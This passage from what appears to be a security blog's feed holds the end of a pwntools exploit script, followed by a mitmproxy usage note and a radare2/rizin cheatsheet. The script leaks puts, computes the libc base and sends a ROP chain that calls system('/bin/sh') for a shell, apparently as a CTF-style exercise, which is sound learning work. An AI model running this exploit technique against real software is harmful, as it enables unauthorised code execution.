rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fill&amp;#34;&lt;/span&gt;])
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enjoy your &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# extract leaked puts address&lt;/span&gt;
raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()  &lt;span style=&#34;color:#75715e&#34;&gt;# \&lt;/span&gt;
raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:]     &lt;span style=&#34;color:#75715e&#34;&gt;# - skip unnecesary data&lt;/span&gt;

leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill missing bytes with zeroes&lt;/span&gt;
leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(leaked_puts)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Leaked puts: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;leaked_puts&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)


pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# calculate offset, base address of the libc in the memory&lt;/span&gt;
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;# prepare the final payload&lt;/span&gt;
rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(libc)
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_gadget([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ret&amp;#39;&lt;/span&gt;]))
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;], [next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))])
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Have fun!&amp;#34;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://www.agner.org/optimize/calling_conventions.pdf&#34;&gt;https://www.agner.org/optimize/calling_conventions.pdf&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&#34;&gt;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;</content>
    </item>
    
    <item>
      <title>!e MITM Proxy</title>
      <link>/posts/mitmproxy/</link>
      <pubDate>Mon, 10 May 2021 17:12:00 +0200</pubDate>
      
      <guid>/posts/mitmproxy/</guid>
      <description></description>
      <content>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://mitmproxy.org/&#34;&gt;https://mitmproxy.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;start&#34;&gt;Start&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# start (default port 8080)&lt;/span&gt;
$ mitmproxy

&lt;span style=&#34;color:#75715e&#34;&gt;# web gui&lt;/span&gt;
$ mitmweb

&lt;span style=&#34;color:#75715e&#34;&gt;# start proxy &amp;amp; save traffic&lt;/span&gt;
$ mitmdump -w cap.log
$ mitmpdump &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;google\.com&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# capture only specified host&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--alow-hosts&lt;/code&gt; listen only for specified traffic i.e &lt;code&gt;google\.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;navigation&#34;&gt;Navigation&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Key&lt;/th&gt;
&lt;th&gt;Info&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Requests List&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Arrows (Up / Down)&lt;/td&gt;
&lt;td&gt;Navigate through replies&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Enter&lt;/td&gt;
&lt;td&gt;Confirm / Enter&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R&lt;/td&gt;
&lt;td&gt;Reply request (re-send request)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Request Details&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Arrows (Left / Right)&lt;/td&gt;
&lt;td&gt;Change Active tabs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;Help&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;I&lt;/td&gt;
&lt;td&gt;Intercept Regex&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;E&lt;/td&gt;
&lt;td&gt;Edit Request&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Q&lt;/td&gt;
&lt;td&gt;Previous Menu&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;A&lt;/td&gt;
&lt;td&gt;Sent Request&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;intercept-requests&#34;&gt;Intercept Requests&lt;/h2&gt;
&lt;p&gt;Press &lt;code&gt;I&lt;/code&gt; after starting mitmproxy and type command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Regex based on URL&lt;/span&gt;
~u RegexHere
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;RED&lt;/strong&gt; colored requests are intercepted enter into it and press &lt;code&gt;E&lt;/code&gt; to modify request content&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>!e radare2 / rizin cheatsheet</title>
      <link>/posts/radare2-rizin-cheatsheet/</link>
      <pubDate>Mon, 03 May 2021 14:40:06 +0100</pubDate>
      
      <guid>/posts/radare2-rizin-cheatsheet/</guid>
      <description>&lt;p&gt;radare2 / rizin cheatsheet&lt;/p&gt;</description>
      <content>&lt;p&gt;radare2 / rizin cheatsheet&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Warning: This cheatsheet was originally created for r2, but it should still be compatibile for rizin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://rada.re&#34;&gt;radare2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://rizin.re&#34;&gt;rizin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;debugging&#34;&gt;Debugging&lt;/h2&gt;
&lt;h4 id=&#34;manage-file&#34;&gt;Manage file&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# open in debug mode&lt;/span&gt;
r2 -d $FILE

doo &lt;span style=&#34;color:#75715e&#34;&gt;# re-open file in debug mode&lt;/span&gt;
ood &lt;span style=&#34;color:#75715e&#34;&gt;# /&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;flow-control&#34;&gt;Flow control&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# display / set breakpoint&lt;/span&gt;
db &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;flag/addr&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# continue to breakpoint&lt;/span&gt;
dc

&lt;span style=&#34;color:#75715e&#34;&gt;# continue until addr / flag (without setting breakpoint)&lt;/span&gt;
dcu &amp;lt;flag/addr&amp;gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# break on syscall name / value&lt;/span&gt;
dcs &amp;lt;syscall&amp;gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# step into N instructions&lt;/span&gt;
ds &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# step over N instructions&lt;/span&gt;
dso &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reverse-debugging&#34;&gt;Reverse debugging&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dts?

&lt;span style=&#34;color:#75715e&#34;&gt;# select some point&lt;/span&gt;
db sym.foo

&lt;span style=&#34;color:#75715e&#34;&gt;# store point in time / start recording?&lt;/span&gt;
dts+
dc

&lt;span style=&#34;color:#75715e&#34;&gt;# go to the previous instruction&lt;/span&gt;
dsb

&lt;span style=&#34;color:#75715e&#34;&gt;# write / read ALL trace sessions to / from disk&lt;/span&gt;
dtst sessions.dbg
dtsf sessions.dbg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;read-values&#34;&gt;Read values&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# show registers&lt;/span&gt;
drr

&lt;span style=&#34;color:#75715e&#34;&gt;# show stack contents&lt;/span&gt;
pxr @ rsp!32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;scripting-hooks&#34;&gt;Scripting (hooks)&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# auto-run command on breakpoint&lt;/span&gt;
db main  						&lt;span style=&#34;color:#75715e&#34;&gt;# set breakpoint&lt;/span&gt;
dbc main drr					&lt;span style=&#34;color:#75715e&#34;&gt;# set command on breakpoint &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;custom-environment&#34;&gt;Custom environment&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that when first starting radare2 in debug mode, you will actually be debugging rarun2! &lt;em&gt;You need to first continue execution (dc)&lt;/em&gt; which will leave you in the loader for the program itself.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# run program with custom environment&lt;/span&gt;
r2 -d rarun2 program&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./&amp;lt;program_name&amp;gt; arg0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;foo stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./&amp;lt;some_file&amp;gt; setenv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ENV_VAR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;value&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;==OR==&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-rr2&#34; data-lang=&#34;rr2&#34;&gt;#!/usr/bin/rarun2
program=./&amp;lt;program_name&amp;gt;
arg0=foo
stdin=./&amp;lt;some_file&amp;gt;
setenv=ENV_VAR=&amp;lt;value&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;r2 -d rarun2 script.rr2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;visual-debugging&#34;&gt;Visual debugging&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;(Enter &lt;code&gt;V&lt;/code&gt; command to enter or &lt;code&gt;VV&lt;/code&gt; / &lt;code&gt;VV!&lt;/code&gt;), with [p] / [P] you can change views)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;With &lt;code&gt;dm&lt;/code&gt; you can check if you are still in loader code - search for &lt;em&gt;(&lt;/em&gt;)*.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;[.] -&amp;gt; seek to program counter&lt;/li&gt;
&lt;li&gt;[c] -&amp;gt; toggle cursor&lt;/li&gt;
&lt;li&gt;[o] -&amp;gt; toggle asm / pseudo&lt;/li&gt;
&lt;li&gt;[g] -&amp;gt; seek to…&lt;/li&gt;
&lt;li&gt;[G] -&amp;gt; seek to highlighted&lt;/li&gt;
&lt;li&gt;[u], [U] -&amp;gt; undo / redo seek&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; , &lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; -&amp;gt; xrefs from/to&lt;/li&gt;
&lt;li&gt;[B], [F2] -&amp;gt; toggle breakpoint&lt;/li&gt;
&lt;li&gt;[s], [F7] -&amp;gt; step into&lt;/li&gt;
&lt;li&gt;[S], [F8] -&amp;gt; step over&lt;/li&gt;
&lt;li&gt;[F9] -&amp;gt; continue&lt;/li&gt;
&lt;li&gt;[t] -&amp;gt; tab managment&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;esil&#34;&gt;ESIL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://monosource.gitbooks.io/radare2-explorations/content/tut3/tut3_-_esil.html&#34;&gt;ESIL · Radare2 Explorations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://radare.gitbooks.io/radare2book/content/disassembling/esil.html&#34;&gt;ESIL · Radare2 Book&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-radare2rc&#34; data-lang=&#34;radare2rc&#34;&gt;e asm.emu = true # esil comments
e io.cache = true # write in memory cache
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;visual-mode&#34;&gt;Visual mode&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;[O] - toggle pseudocode / ESIL&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;commands&#34;&gt;Commands&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# check used registers by the function&lt;/span&gt;
aeaf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;example-session&#34;&gt;Example session&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aei 	&lt;span style=&#34;color:#75715e&#34;&gt;# init esil vm &lt;/span&gt;
aeim  &lt;span style=&#34;color:#75715e&#34;&gt;# init mem &lt;/span&gt;
aeip 	&lt;span style=&#34;color:#75715e&#34;&gt;# set esil vm pointer to current seek&lt;/span&gt;
aer	&lt;span style=&#34;color:#75715e&#34;&gt;# handle esil registers&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# example set value&lt;/span&gt;
aer eax&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x1234 &lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# continue until eax is not greater than on start&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aecue eax,0x1234,&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;macros&#34;&gt;Macros&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://radare.gitbooks.io/radare2book/content/scripting/macros.html&#34;&gt;Macros · Radare2 Book&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Example session&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set up relative breakpoints. one per cmp instruction*&lt;/span&gt;
db sym.check_code_int+0x00001289-0x00001265
db sym.check_code_int+0x000012b7-0x00001265
db sym.check_code_int+0x000012e2-0x00001265
db sym.check_code_int+0x0000130d-0x00001265*#* *execute program*
dc* &lt;span style=&#34;color:#75715e&#34;&gt;# input four digits (doesn&amp;#39;t matter which ones)*&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
1*# define a macro that replaces the value *
*# of ebx with the content of eax and stores it into a file*
!rm ./crack_code
&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;eax_replace, dr ebx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;dr eax&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; | tee -a crack_code, dc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;*# use the macro*
.&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;eax_replace &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;@@&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; 3*# show the results*
!cat ./crack_code
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;malware-analysis&#34;&gt;Malware Analysis&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ob&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# show open files&lt;/span&gt;
afl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# list function ranges&lt;/span&gt;
aflt &lt;span style=&#34;color:#75715e&#34;&gt;# show function table&lt;/span&gt;

p&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;# show hist of entropy&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# show hist entropy horizontal&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;operations&#34;&gt;Operations&lt;/h2&gt;
&lt;h4 id=&#34;writing&#34;&gt;Writing&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;r2 -w binary
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# write null-terminated string&lt;/span&gt;
wz &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello there&amp;#34;&lt;/span&gt;
psz &lt;span style=&#34;color:#75715e&#34;&gt;# print it&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# write number at offset&lt;/span&gt;
wx deadbeef @ 0x30
p8 @ 0x30!4 &lt;span style=&#34;color:#75715e&#34;&gt;# print&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;write-in-block&#34;&gt;Write in block&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wo?

&lt;span style=&#34;color:#75715e&#34;&gt;# write bytes in sequence starting from 42, incrementing by 3&lt;/span&gt;
woe &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; @ edi!32

&lt;span style=&#34;color:#75715e&#34;&gt;# xor block of memory by 41&lt;/span&gt;
wx &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; @ esp!32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;visual-mode-1&#34;&gt;Visual mode&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;[TAB] -&amp;gt; switch between columns&lt;/li&gt;
&lt;li&gt;[c] -&amp;gt; toggle cursor mode&lt;/li&gt;
&lt;li&gt;[i] -&amp;gt; enter &lt;em&gt;insert&lt;/em&gt; mode&lt;/li&gt;
&lt;li&gt;[A] -&amp;gt; assemble binary:
&lt;ul&gt;
&lt;li&gt;enter your asm,&lt;/li&gt;
&lt;li&gt;instructions can be separated with &lt;code&gt;;&lt;/code&gt;,&lt;/li&gt;
